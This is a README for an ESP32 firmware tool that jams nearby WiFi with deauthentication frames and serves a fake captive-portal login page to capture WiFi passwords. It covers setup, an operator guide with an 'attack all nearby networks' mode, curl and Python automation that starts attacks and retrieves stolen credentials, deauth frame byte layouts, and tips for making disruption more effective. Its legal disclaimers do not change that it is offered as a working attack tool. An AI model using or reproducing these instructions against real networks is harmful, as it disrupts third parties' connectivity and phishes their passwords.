# ESP32 WiFi DeAuth & Credential Harvester

A powerful penetration testing tool for ESP32 that combines WiFi deauthentication attacks with credential harvesting via captive portal.

```
⚠️  LEGAL WARNING  ⚠️
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
This tool is for AUTHORIZED PENETRATION TESTING ONLY!

Unauthorized use of this tool is ILLEGAL and punishable by law.
Only use on networks you OWN or have EXPLICIT WRITTEN PERMISSION to test.

By using this tool, you agree to take full responsibility for your actions.
The authors are not liable for any misuse or damage caused.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## Features

### 🎯 Attack Modes
- **Auto DeAuth**: Automatically deauthenticates all nearby WiFi networks
- **Selective DeAuth**: Target specific networks for deauthentication
- **Captive Portal**: Create a fake WiFi login page to harvest credentials

### 🎛️ Control Interface
- **Web-based Control Panel**: Access via AP (http://192.168.4.1)
- **Network Scanner**: Scan and identify nearby WiFi networks
- **Real-time Status**: Monitor attack progress and captured credentials
- **Configurable Parameters**: Adjust packet count, delay, and targets

### 📡 Technical Capabilities
- Sends IEEE 802.11 deauthentication frames
- DNS server for captive portal redirection
- Credential storage in non-volatile memory
- Multi-channel scanning and attacking
- Concurrent AP and STA mode operation

## Hardware Requirements

### Supported ESP32 Boards
- ✅ ESP32 DevKit V1
- ✅ ESP32-WROOM-32
- ✅ ESP32-WROVER
- ✅ NodeMCU-32S
- ✅ ESP32-S2
- ✅ ESP32-S3
- ✅ ESP32-C3
- ✅ Most other ESP32 variants

### Minimum Specifications
- **Flash Memory**: 4MB (minimum)
- **RAM**: 520KB (ESP32 standard)
- **WiFi**: 2.4GHz 802.11 b/g/n

## Installation

### Option 1: Arduino IDE (Recommended for Beginners)

#### Step 1: Install Arduino IDE
Download and install Arduino IDE from: https://www.arduino.cc/en/software

#### Step 2: Install ESP32 Board Support
1. Open Arduino IDE
2. Go to **File → Preferences**
3. In "Additional Board Manager URLs", add:
   ```
   https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json
   ```
4. Click **OK**
5. Go to **Tools → Board → Boards Manager**
6. Search for "**ESP32**"
7. Install "**ESP32 by Espressif Systems**" (version 2.0.0 or higher)
8. Wait for installation to complete

#### Step 3: Open the Sketch
1. Open `ESP32_DeauthTool.ino` in Arduino IDE
2. Go to **Tools → Board** and select your ESP32 board (e.g., "ESP32 Dev Module")
3. Go to **Tools → Port** and select the COM port your ESP32 is connected to

#### Step 4: Configure Board Settings
- **Board**: ESP32 Dev Module (or your specific board)
- **Upload Speed**: 921600
- **CPU Frequency**: 240MHz
- **Flash Frequency**: 80MHz
- **Flash Mode**: QIO
- **Flash Size**: 4MB (or your board's flash size)
- **Partition Scheme**: Default 4MB with spiffs
- **Core Debug Level**: None (or "Info" for debugging)

#### Step 5: Upload
1. Connect your ESP32 to your computer via USB
2. Click the **Upload** button (→)
3. Wait for compilation and upload to complete
4. Open **Serial Monitor** (Tools → Serial Monitor)
5. Set baud rate to **115200**
6. Press the **RESET** button on your ESP32

### Option 2: PlatformIO (Recommended for Advanced Users)

#### Step 1: Install PlatformIO
- **VS Code**: Install PlatformIO IDE extension
- **Standalone**: Download from https://platformio.org/

#### Step 2: Open Project
1. Open VS Code or PlatformIO IDE
2. Click **Open Project**
3. Select the `ESP32_DeauthTool` folder
4. PlatformIO will automatically download all dependencies

#### Step 3: Build and Upload
1. Connect your ESP32 via USB
2. Click **Upload** button (PlatformIO toolbar)
3. Or use command: `pio run -t upload`
4. Open Serial Monitor to view output

## Configuration

### Default Access Point Settings
```cpp
SSID: ESP32_Control
Password: deauth123
IP Address: 192.168.4.1
Web Interface: http://192.168.4.1
```

### Customization
Edit these lines in `ESP32_DeauthTool.ino` to change AP credentials:
```cpp
#define AP_SSID "ESP32_Control"  // Change to your desired SSID
#define AP_PASS "deauth123"      // Change to your desired password
```

## Usage Guide

### 🚀 Quick Start

1. **Power On**
   - Connect ESP32 to USB power bank or computer
   - Wait 5-10 seconds for boot-up

2. **Connect to ESP32**
   - Look for WiFi network: `ESP32_Control`
   - Password: `deauth123`
   - Your device will automatically connect

3. **Open Control Panel**
   - Open browser on connected device
   - Go to: `http://192.168.4.1`
   - Control panel will load

### 📡 Network Scanning

1. Click **"Scan Networks"** button
2. Wait 2-5 seconds for scan to complete
3. View list of detected networks with:
   - SSID (network name)
   - BSSID (MAC address)
   - Channel number
   - Signal strength (RSSI)

### ⚔️ Auto DeAuth Attack

**Use Case**: Test all nearby networks simultaneously

1. Select **"Auto DeAuth (All Networks)"** from Attack Mode
2. Set **Packets per AP** (default: 20)
   - Lower = faster but less effective
   - Higher = slower but more disruptive
3. Set **Delay** in milliseconds (default: 100ms)
4. Click **"🚀 Start Attack"**
5. Monitor Serial Monitor for packet logs
6. Click **"🛑 Stop Attack"** when done

**What happens**: ESP32 sends deauth packets to all detected networks, forcing clients to disconnect.

### 🎯 Selective DeAuth Attack

**Use Case**: Target a specific network

1. Click **"Scan Networks"** first
2. Select **"Selective DeAuth (Choose Target)"** mode
3. Click **"Target"** button next to desired network
4. Configure packets and delay
5. Click **"🚀 Start Attack"**

**What happens**: ESP32 focuses all deauth packets on one specific network.

### 🕸️ Captive Portal Attack

**Use Case**: Harvest WiFi credentials

1. Select **"Captive Portal (Credential Harvest)"** mode
2. Click **"🚀 Start Attack"**
3. ESP32 creates a fake WiFi login page
4. When users try to access internet, they see login prompt
5. Credentials entered are captured and stored
6. View captured credentials:
   - Click **"🔑 View Captured Credentials"**
   - Or check Serial Monitor
   - Or use `/credentials` endpoint

**What happens**: DNS server redirects all requests to captive portal. Users think they need to re-enter WiFi password.

### 📊 Monitoring & Status

- **Auto-refresh**: Status updates every 3 seconds
- **Manual refresh**: Click "🔄 Refresh Status"
- **Serial Monitor**: View detailed packet logs at 115200 baud
- **Credential View**: Click "🔑 View Captured Credentials"

## Serial Monitor Commands

When connected via USB, you can monitor activity:

```
=================================
ESP32 DeAuth & Credential Harvester
=================================

[+] SPIFFS Mounted Successfully
[+] Access Point Started
    SSID: ESP32_Control
    IP: 192.168.4.1
[+] Web Server Started on port 80
[+] Setup Complete!
[+] Connect to AP: ESP32_Control
[+] Password: deauth123
[+] Control Panel: http://192.168.4.1
[+] Ready for commands!

[*] Scanning networks...
[*] Found 12 networks
  [0] MyHomeNetwork (AA:BB:CC:DD:EE:FF) Ch:6 RSSI:-45
  [1] NeighborWiFi (11:22:33:44:55:66) Ch:11 RSSI:-67
  ...

[!] Starting AUTO DEAUTH mode
[*] Sending deauth packets...
[*] Sent 20 deauth packets to AA:BB:CC:DD:EE:FF on channel 6
[*] Sent 20 deauth packets to 11:22:33:44:55:66 on channel 11
...

[+] CREDENTIAL CAPTURED!
    SSID: MyHomeNetwork | Password: password123
```

## API Endpoints

The web server exposes these REST API endpoints:

| Endpoint | Method | Description |
|----------|--------|-------------|
| `/` | GET | Main control panel interface |
| `/scan` | GET | Scan networks, returns JSON |
| `/attack?mode=X&packets=Y&delay=Z` | GET | Start attack |
| `/stop` | GET | Stop current attack |
| `/status` | GET | Get current status (JSON) |
| `/credentials` | GET | Get captured credentials (JSON) |
| `/captive` | GET | Captive portal login page |
| `/save-credentials` | POST | Save captured credentials |

### Example API Usage

**Scan Networks**:
```bash
curl http://192.168.4.1/scan
```

**Start Auto DeAuth**:
```bash
curl "http://192.168.4.1/attack?mode=auto&packets=20&delay=100"
```

**Stop Attack**:
```bash
curl http://192.168.4.1/stop
```

**Check Status**:
```bash
curl http://192.168.4.1/status
```

**Get Credentials**:
```bash
curl http://192.168.4.1/credentials
```

## Troubleshooting

### ESP32 won't upload
- **Issue**: "Failed to connect to ESP32"
- **Solution**:
  - Hold **BOOT** button while clicking upload
  - Try different USB cable
  - Reduce upload speed to 115200
  - Check if correct COM port is selected

### No networks detected
- **Issue**: Scan returns 0 networks
- **Solution**:
  - Check antenna is properly connected
  - Move ESP32 to area with more WiFi networks
  - Try power cycling the ESP32

### Web interface won't load
- **Issue**: Cannot access http://192.168.4.1
- **Solution**:
  - Ensure you're connected to ESP32_Control AP
  - Try http://192.168.4.1 in different browser
  - Disable mobile data on phone (if using phone)
  - Check Serial Monitor to confirm ESP32 started properly

### Deauth not working
- **Issue**: Devices stay connected
- **Solution**:
  - Increase packets per AP (try 50-100)
  - Decrease delay (try 50ms)
  - Some devices are resistant to deauth attacks
  - Try 5GHz networks may not be affected (ESP32 is 2.4GHz only)

### Captive portal not showing
- **Issue**: Users don't see login page
- **Solution**:
  - Make sure attack mode is set to "Captive Portal"
  - Clear browser cache
  - Try accessing any http:// website (not https://)
  - Some modern devices may not show captive portal automatically

### Out of memory errors
- **Issue**: ESP32 crashes or reboots
- **Solution**:
  - Reduce number of stored credentials
  - Use ESP32 with more RAM (WROVER variant)
  - Clear preferences: `preferences.clear()`

## Advanced Usage

### Command via API Script

Create a Python script to automate attacks:

```python
import requests
import time

ESP32_IP = "http://192.168.4.1"

# Scan networks
response = requests.get(f"{ESP32_IP}/scan")
networks = response.json()['networks']
print(f"Found {len(networks)} networks")

# Start auto deauth
requests.get(f"{ESP32_IP}/attack?mode=auto&packets=50&delay=100")
print("Attack started!")

# Run for 60 seconds
time.sleep(60)

# Stop attack
requests.get(f"{ESP32_IP}/stop")
print("Attack stopped!")

# Get credentials
creds = requests.get(f"{ESP32_IP}/credentials").json()
print(f"Captured {len(creds['credentials'])} credentials")
for cred in creds['credentials']:
    print(f"  - {cred}")
```

### Modify Deauth Reason Code

Edit line in `ESP32_DeauthTool.ino`:
```cpp
0x07, 0x00  // Reason: Class 3 frame from non-associated STA
```

Available reason codes:
- `0x01` - Unspecified reason
- `0x02` - Previous authentication no longer valid
- `0x03` - Deauthenticated because sending STA is leaving
- `0x04` - Disassociated due to inactivity
- `0x05` - Disassociated because AP is unable to handle all currently associated STAs
- `0x06` - Class 2 frame received from nonauthenticated STA
- `0x07` - Class 3 frame received from nonassociated STA (default)

### Change AP Configuration

Modify these definitions:
```cpp
#define AP_SSID "ESP32_Control"  // Your custom SSID
#define AP_PASS "deauth123"      // Your custom password
#define DNS_PORT 53              // DNS server port
#define WEB_PORT 80              // Web server port
```

## Technical Details

### How Deauth Works

WiFi deauthentication exploits the unencrypted management frames in 802.11:

1. ESP32 sends spoofed deauth frames pretending to be the AP
2. Clients receive "disconnect" command and drop connection
3. Clients attempt to reconnect
4. Process repeats, keeping clients disconnected

### Packet Structure

```
Deauth Packet (26 bytes):
[0-1]   Frame Control (0xC0, 0x00)
[2-3]   Duration (0x00, 0x00)
[4-9]   Destination (FF:FF:FF:FF:FF:FF - broadcast)
[10-15] Source (Target AP BSSID)
[16-21] BSSID (Target AP BSSID)
[22-23] Sequence (0x00, 0x00)
[24-25] Reason Code (0x07, 0x00)
```

### Captive Portal Flow

```
User connects → DNS request → ESP32 DNS server
    ↓
ESP32 responds: "All domains point to 192.168.4.1"
    ↓
User opens browser → http://anything.com → 192.168.4.1
    ↓
ESP32 serves fake login page
    ↓
User enters credentials → POST to /save-credentials
    ↓
ESP32 saves credentials → Shows "success" page
```

## Legal & Ethical Use

### ✅ Legitimate Uses
- Testing your own network security
- Authorized penetration testing engagements
- Security research in controlled environments
- Educational demonstrations with permission
- CTF competitions and security training

### ❌ Illegal Uses
- Attacking networks without permission
- Public WiFi disruption
- Harvesting others' credentials without authorization
- Any malicious or unauthorized use

### Responsible Disclosure
If you discover vulnerabilities using this tool:
1. Document findings professionally
2. Notify network owner immediately
3. Allow reasonable time for fixes
4. Do not publish details without permission

## References & Resources

- **ESP32 Arduino Core**: https://github.com/espressif/arduino-esp32
- **ESP32 WiFi Documentation**: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/network/esp_wifi.html
- **IEEE 802.11 Standard**: https://standards.ieee.org/standard/802_11-2020.html
- **WiFi Security Testing Guide**: https://www.wi-fi.org/discover-wi-fi/security

## Contributing

Contributions are welcome! Please:
1. Fork the repository
2. Create feature branch
3. Test thoroughly
4. Submit pull request with clear description

## Support

**Issues**: Report bugs or request features via GitHub Issues

**Security Vulnerabilities**: Report privately to maintain responsible disclosure

## License

This project is for **educational and authorized security testing only**.

```
MIT License - Educational Use Only

THE SOFTWARE IS PROVIDED "AS IS" FOR AUTHORIZED SECURITY TESTING ONLY.
UNAUTHORIZED USE IS STRICTLY PROHIBITED AND MAY BE ILLEGAL.

USE AT YOUR OWN RISK. AUTHORS ARE NOT LIABLE FOR MISUSE OR DAMAGES.
```

## Disclaimer

This tool demonstrates WiFi security vulnerabilities for educational purposes.

**The authors:**
- Do NOT condone illegal activity
- Are NOT responsible for misuse
- Recommend using ONLY on authorized networks
- Encourage responsible security research

**Users are solely responsible for compliance with all applicable laws.**

---

**Built with ❤️ for the security research community**

**Remember: With great power comes great responsibility. Use wisely.**
